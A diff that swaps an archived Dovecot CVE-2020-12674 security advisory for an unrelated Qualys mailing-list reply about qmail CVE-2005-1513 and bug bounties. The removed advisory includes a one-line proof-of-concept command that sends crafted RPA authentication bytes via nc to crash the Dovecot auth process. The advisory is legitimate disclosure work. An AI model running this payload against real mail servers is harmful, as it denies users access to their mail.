@@ -1,52 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/12/3
-Message-ID: <23b7bb55-ebda-ced8-59ba-947403204b24@dovecot.fi>
-Date: Wed, 12 Aug 2020 16:14:46 +0300
-From: Aki Tuomi <aki.tuomi@...ecot.fi>
-To: oss-security <oss-security@...ts.openwall.com>, full-disclosure <full-disclosure@...ts.openwall.com>
-Subject: CVE-2020-12674: Dovecot IMAP server: Specially crafted RPA authentication message crashes auth
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/05/20/5
+Message-ID: <20200520173917.GA1134@localhost.localdomain>
+Date: Wed, 20 May 2020 10:39:17 -0700
+From: Qualys Security Advisory <qsa@...lys.com>
+To: Georgi Guninski <gguninski@...il.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Remote Code Execution in qmail (CVE-2005-1513)
 Content-Type: text/plain; charset=utf-8
 
-Open-Xchange Security Advisory 2020-08-12
+Hi Georgi,
 
-Affected product: Dovecot IMAP server
-Internal reference: DOP-1869 (Bug ID)
-Vulnerability type: CWE-126 (Buffer over-read)
-Vulnerable version: 2.2
-Vulnerable component: auth
-Fixed version: 2.3.11.3
-Report confidence: Confirmed
-Solution status: Fix available
-Vendor notification: 2020-05-03
-Researcher credit: Orange from DEVCORE team
-CVE reference: CVE-2020-12674
-CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
+On Wed, May 20, 2020 at 11:54:06AM +0300, Georgi Guninski wrote:
+> Did djb award you monetary bounty?
 
-Vulnerability Details:
-Dovecot's RPA mechanism implementation accepts zero-length message,
-which leads to assert-crash later on
+No, he considers that this is a vulnerability in the OS startup scripts,
+not in qmail itself. In any case, the bug bounty would be yours, of
+course.
 
-Risk:
-An adversary can use this vulnerability to crash dovecot auth process
-repeatedly, preventing login.
+Thanks again for all your security research, and your qmail research in
+particular!
 
-Steps to reproduce:
-(echo 'AUTH RPA'; echo -ne
-'\x60\x11\x06\x09\x60\x86\x48\x01\x86\xf8\x73\x01\x01\x01\x00\x04\x00\x00\x01'
-| base64 -w 0; echo ; echo -ne
-'\x60\x11\x06\x09\x60\x86\x48\x01\x86\xf8\x73\x01\x01\x00\x03A@A\x00' |
-base64 -w 0; echo ; echo QUIT) | nc 127.0.0.1 110
+With best regards,
 
-Workaround:
-Disable RPA authentication.
+--
+the Qualys Security Advisory team
 
-Solution:
-Upgrade to fixed version.
 
-Best regards,
-Aki Tuomi
-Open-Xchange oy
+[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
 
 
 
-Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
+This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.
